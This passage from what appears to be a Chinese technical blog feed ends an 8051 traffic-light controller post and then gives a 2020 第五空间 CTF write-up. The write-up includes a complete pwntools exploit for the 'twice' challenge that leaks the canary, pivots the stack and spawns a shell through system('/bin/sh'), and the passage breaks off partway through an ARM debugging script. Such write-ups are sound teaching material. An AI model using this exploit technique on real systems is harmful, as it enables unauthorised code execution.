<span class="title">int0</span><span class="params">(<span class="keyword">void</span>)</span> interrupt 0 <span class="keyword">using</span> 1    <span class="comment">//禁止通行</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(!key_EP)display();</span><br><span class="line">    flag_option=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>处理逻辑：关交通灯定时器、灭显示、全部置红灯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TR0=<span class="number">0</span>;<span class="comment">//关交通灯定时器</span></span><br><span class="line">P2=<span class="number">0x00</span>;<span class="comment">//灭显示</span></span><br><span class="line">Red_dx=<span class="number">1</span>;                   <span class="comment">//全部置红灯</span></span><br><span class="line">Red_nb=<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>恢复逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TR0=<span class="number">1</span>;<span class="comment">//开交通灯定时器</span></span><br><span class="line">P2=<span class="number">0X00</span>;<span class="comment">//关全部信号灯</span></span><br><span class="line">Green_dx=<span class="number">1</span>;<span class="comment">//东西绿灯亮</span></span><br><span class="line">Red_nb=<span class="number">1</span>;<span class="comment">//南北红灯亮</span></span><br><span class="line">sec_dx=set_timedx;          <span class="comment">//回到初值</span></span><br><span class="line">sec_nb=sec_dx+<span class="number">5</span>;</span><br></pre></td></tr></table></figure><p>通过一个计数器实现进入与恢复：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conut_ER=<span class="number">1</span>-conut_ER;</span><br><span class="line"><span class="keyword">if</span>(conut_ER==<span class="number">1</span>)&#123;&#125;</span><br><span class="line"><span class="keyword">if</span>(conut_ER==<span class="number">0</span>)&#123;&#125;</span><br></pre></td></tr></table></figure><h4 id="夜间模式"><a href="#夜间模式" class="headerlink" title="夜间模式"></a>夜间模式</h4><blockquote><p>全部方向黄灯频闪</p></blockquote><p>处理逻辑大致与上面一样，差异是控制频闪放在定时器中断1服务中。这里功能函数修改一个全局标志位，让定时器1启动输出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">conut_night=<span class="number">1</span>-conut_night;</span><br><span class="line"><span class="keyword">if</span>(conut_night==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    TR0=<span class="number">0</span>;<span class="comment">//关交通灯定时器</span></span><br><span class="line">    P2=<span class="number">0x00</span>;                    <span class="comment">//关全部信号灯</span></span><br><span class="line">    flag_Night=<span class="number">1</span>;               <span class="comment">//打开夜间模式</span></span><br><span class="line">    sec_dx=<span class="number">00</span>;<span class="comment">//四个方向的时间都为00</span></span><br><span class="line">    sec_nb=<span class="number">00</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(conut_night==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    TR0=<span class="number">1</span>;<span class="comment">//开交通灯定时器</span></span><br><span class="line">    P2=<span class="number">0x00</span>;                    <span class="comment">//关全部信号灯</span></span><br><span class="line">    Green_dx=<span class="number">1</span>;<span class="comment">//东西绿灯亮</span></span><br><span class="line">    Red_nb=<span class="number">1</span>;<span class="comment">//南北红灯亮</span></span><br><span class="line">    flag_Night=<span class="number">0</span>;               <span class="comment">//打开夜间模式</span></span><br><span class="line">    sec_dx=set_timedx;          <span class="comment">//回到初值</span></span><br><span class="line">    sec_nb=sec_dx+<span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line">flag_option=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>定时器1中断服务，控制黄灯每 0.5 s 反转一次：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*用来处理夜间黄灯闪烁*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">time1</span><span class="params">(<span class="keyword">void</span>)</span> interrupt 3 <span class="comment">//定时中断子程序</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TH1=<span class="number">0x4C</span>;<span class="comment">//重赋初值;11.0592m晶振50ms</span></span><br><span class="line">    TL1=<span class="number">0X00</span>;</span><br><span class="line">    countt1++;<span class="comment">//计数器数加1（用于计算时间）</span></span><br><span class="line">    <span class="keyword">if</span>(countt1==<span class="number">10</span>)    <span class="comment">//定时器中断次数=10时（即0.5秒）</span></span><br><span class="line">&#123;   </span><br><span class="line"><span class="keyword">if</span>(flag_Night==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">Yellow_nb=~Yellow_nb;<span class="comment">//南北黄灯</span></span><br><span class="line">Yellow_dx=~Yellow_nb;<span class="comment">//东西黄灯   </span></span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">    <span class="keyword">if</span>(countt1==<span class="number">20</span>)                  <span class="comment">//定时器中断次数=20时（即1秒时）</span></span><br><span class="line">    &#123;</span><br><span class="line">        countt1=<span class="number">0</span>;<span class="comment">//清零计数器</span></span><br><span class="line">        <span class="keyword">if</span>(flag_Night==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Yellow_nb=~Yellow_nb;<span class="comment">//南北黄灯</span></span><br><span class="line">            Yellow_dx=~Yellow_nb;<span class="comment">//东西黄灯</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="演示截图"><a href="#演示截图" class="headerlink" title="演示截图"></a>演示截图</h3><ol><li><p>模拟电路电路图：</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200701224551.png"></p></li><li><p>信号控制演示</p><p><img src="https://mrskye.cn-gd.ufileos.com/img%2F%E4%BF%A1%E5%8F%B7%E6%8E%A7%E5%88%B6%E6%BC%94%E7%A4%BA.gif"></p></li><li><p>紧急模式</p><p><img src="https://mrskye.cn-gd.ufileos.com/img%2F%E7%B4%A7%E6%80%A5%E6%A8%A1%E5%BC%8F.gif"></p></li><li><p>夜间模式</p><p><img src="https://mrskye.cn-gd.ufileos.com/img%2F%E5%A4%9C%E9%97%B4%E6%A8%A1%E5%BC%8F.gif"></p></li></ol><h3 id="Github-仓库"><a href="#Github-仓库" class="headerlink" title="Github 仓库"></a>Github 仓库</h3><p>该项目托管在Github@<a href="https://github.com/skyedai910">skyedai910</a>/<strong><a href="https://github.com/skyedai910/traffic-lights-BC">traffic-lights-BC</a></strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 交通灯 </tag>
            
            <tag> 单片机 </tag>
            
            <tag> C51 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020第五空间部分Writeup</title>
      <link href="archives/5212ef8a/"/>
      <url>archives/5212ef8a/</url>
      
        <content type="html"><![CDATA[<h2 id="twice"><a href="#twice" class="headerlink" title="twice"></a>twice</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="保护情况"><a href="#保护情况" class="headerlink" title="保护情况"></a>保护情况</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h4 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><p>程序一共有两次输入的机会，第一次输入长度为 0x50+9 ；第二次输入长度为：0x50+0x20 。存储字符串的变量 s 距离 rbp 是 0x60 ，也就是第二次输入是栈溢出，溢出长度仅可覆盖 rip 。</p><p>输入处理函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_4007A9</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> length; <span class="comment">// [rsp+18h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-64h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">88</span>]; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;&gt;&#x27;</span>);</span><br><span class="line">  length = sub_40076D(<span class="number">0x50</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = read(<span class="number">0</span>, s, length);<span class="comment">//第二次输入栈溢出</span></span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    s[v4 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>处理输入长度处理函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_40076D</span><span class="params">(<span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( nCount )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( nCount == <span class="number">1</span> )</span><br><span class="line">      v2 = length + <span class="number">0x20</span>;<span class="comment">//第二次输入</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = length + <span class="number">9</span>;<span class="comment">//第一次输入</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h4 id="泄露canary"><a href="#泄露canary" class="headerlink" title="泄露canary"></a>泄露canary</h4><p>存在栈溢出肯定是需要利用栈溢出的，但是程序开始了 canary ，所以首先得绕过这个保护。第一次输入的时候可以输入长度刚刚好是 0x59 ，可以覆盖 canary 低字节的结束符，然后在后续中打印出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x59</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><h4 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h4><p>绕过 canary 之后就是利用栈溢出了，溢出长度不多仅仅能够覆盖 rip ，也就是不能直接通过普通栈溢出泄露 libc 地址，更别想后面的传参和调用 system 。溢出长度不够可以试下栈迁移。</p><p>我们只能控制栈上的数据，所以将 A 栈劫持到 B 栈。那就是需要知道我们能控制的栈的地址，就是需要泄露栈的 rbp 中的值（下一个栈的 rbp 内存地址）减去固定偏移，获得当前栈的内存地址。</p><p>泄露的 payload 不需要单独构造，在泄露 canary 的时候就一起泄露出来了。因为 canary 是 8 字节，只是最低位是结束符，所以当最低位被覆盖后，puts 会一直输出直到遇到 rbp 中的结束符（\x00）。</p><p>通过调试发现偏移为 0x70 。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tcnNreWUuY24tZ2QudWZpbGVvcy5jb20vaW1nLzIwMjAtMDYtMjUtd3RWTjAwcHliUDJGUERGMi5wbmc?x-oss-process=image/format,png"></p><h4 id="泄露-libc"><a href="#泄露-libc" class="headerlink" title="泄露 libc"></a>泄露 libc</h4><p>在第二次输入的时，同时写入要执行的命令和溢出 rbp&amp;rip 。首先写入需要执行的命令，写的时候是从 0x8 个字节开始写。因为汇编的 <code>leave|ret</code> 最后会将 rsp 指向 rbp + 8 的地址，然后通过 ret 将 rbp + 8 地址的值压入 rip 中。最后还要一个 main 完成 ROP 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br></pre></td></tr></table></figure><p>填充长度，补上 canary ，将 rbp 覆盖为预定值，rip 再一次调用 <code>leave|ret</code> 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = payload.ljust(<span class="number">0x58</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(canary)</span><br><span class="line">payload += p64(stack_addr-<span class="number">0x70</span>) + p64(leave_ret)</span><br></pre></td></tr></table></figure><p>两次 <code>leave|ret</code> rbp、rsp 变化：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> begin</span></span><br><span class="line">RBP  0x7fffffffdd80 —▸ 0x7fffffffdd20 ◂— &#x27;aaaaaaaa#\t@&#x27;</span><br><span class="line">RSP  0x7fffffffdd00 ◂— 0x0</span><br><span class="line">RIP  0x400879 (sub_400676+208) ◂— leave</span><br><span class="line"><span class="meta">#</span><span class="bash"> round1</span></span><br><span class="line">RBP  0x7fffffffdd20 ◂— &#x27;aaaaaaaa#\t@&#x27;</span><br><span class="line">RSP  0x7fffffffdd88 —▸ 0x400879 (sub_400676+208) ◂— leave  </span><br><span class="line">RIP  0x40087a (sub_400676+209) ◂— ret  </span><br><span class="line"><span class="meta">#</span><span class="bash"> round2</span></span><br><span class="line">RBP  0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">RSP  0x7fffffffdd28 —▸ 0x400923 (__libc_csu_init+99) ◂— pop    rdi</span><br><span class="line">RIP  0x40087a (sub_400676+209) ◂— ret   </span><br></pre></td></tr></table></figure><h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>溢出长度不够，getshell 还是劫持流程返回到栈上。因为不是正常逻辑的调用，栈空间肯定是变化的，所以需用重新泄露 栈地址 （canary不变）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi) + p64(binsh) + p64(system) + p64(main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x58</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(canary)</span><br><span class="line">payload += p64(stack_addr-<span class="number">0x70</span>) + p64(leave_ret)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : twice.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;121.36.59.116&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;puts_plt:&quot;</span>+<span class="built_in">hex</span>(puts_plt))</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;puts_got:&quot;</span>+<span class="built_in">hex</span>(puts_got))</span><br><span class="line">main_addr = <span class="number">0x040087B</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400923</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400879</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak canary&amp;stack</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x59</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x59</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;stack_addr:&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x58</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(canary)</span><br><span class="line">payload += p64(stack_addr-<span class="number">0x70</span>) + p64(leave_ret)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">puts_leak = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;puts_leak:&quot;</span>+<span class="built_in">hex</span>(puts_leak))</span><br><span class="line">libc_base = puts_leak - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">log.info(<span class="string">&quot;binsh:&quot;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x59</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x59</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;stack_addr:&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi) + p64(binsh) + p64(system) + p64(main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x58</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(canary)</span><br><span class="line">payload += p64(stack_addr-<span class="number">0x70</span>) + p64(leave_ret)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwnme"><a href="#pwnme" class="headerlink" title="pwnme"></a>pwnme</h2><h3 id="本地调试环境"><a href="#本地调试环境" class="headerlink" title="本地调试环境"></a>本地调试环境</h3><blockquote><p>在两位师兄和群里大佬帮助下实现本地调试</p><p><a href="https://blog.csdn.net/Mculover666/article/details/105251880">Ubuntu16.04 安装 qemu 运行 Linux 3.16</a></p><p><a href="https://m4x.fun/post/how-2-pwn-an-arm-binary/">如何 pwn 掉一个 arm 的binary</a></p></blockquote><h4 id="安装文件"><a href="#安装文件" class="headerlink" title="安装文件"></a>安装文件</h4><p>安装qemu：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu qemu-system-arm</span><br></pre></td></tr></table></figure><p>安装桥接工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install uml-utilities</span><br><span class="line">sudo apt-get install bridge-utils</span><br></pre></td></tr></table></figure><p>安装交叉编译工具链</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-arm-linux-gnueabi</span><br></pre></td></tr></table></figure><h4 id="安装libc"><a href="#安装libc" class="headerlink" title="安装libc"></a>安装libc</h4><p>将题目给的 lib 文件中的 so 文件放入到虚拟机的 /lib 文件夹。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tcnNreWUuY24tZ2QudWZpbGVvcy5jb20vaW1nLzIwMjAtMDYtMjYtRXBqRlNSdkhCVlM1SWZzNi5wbmc?x-oss-process=image/format,png"></p><p>建立链接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s ./libuClibc-1.0.34.so ./libc.so.0</span><br><span class="line">sudo ln -s ./ld-uClibc-1.0.34.so ./ld-uClibc.so.0</span><br><span class="line">sudo ln -s ./libthread_db-1.0.34.so ./libthread_db.so.0</span><br></pre></td></tr></table></figure><h4 id="运行-amp-调试"><a href="#运行-amp-调试" class="headerlink" title="运行&amp;调试"></a>运行&amp;调试</h4><p>引用 <a href="https://github.com/bash-c">bash-c</a> 的模版，做题 exp 就写在这个模版后面：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;a.out&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    sh = remote(<span class="string">&quot;remote_addr&quot;</span>, remote_port)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    sh = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>, <span class="string">&quot;a.out&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>, <span class="string">&quot;a.out&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;a.out&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;)</span></span><br><span class="line"><span class="comment"># local libc</span></span><br><span class="line">libc = ELF(<span 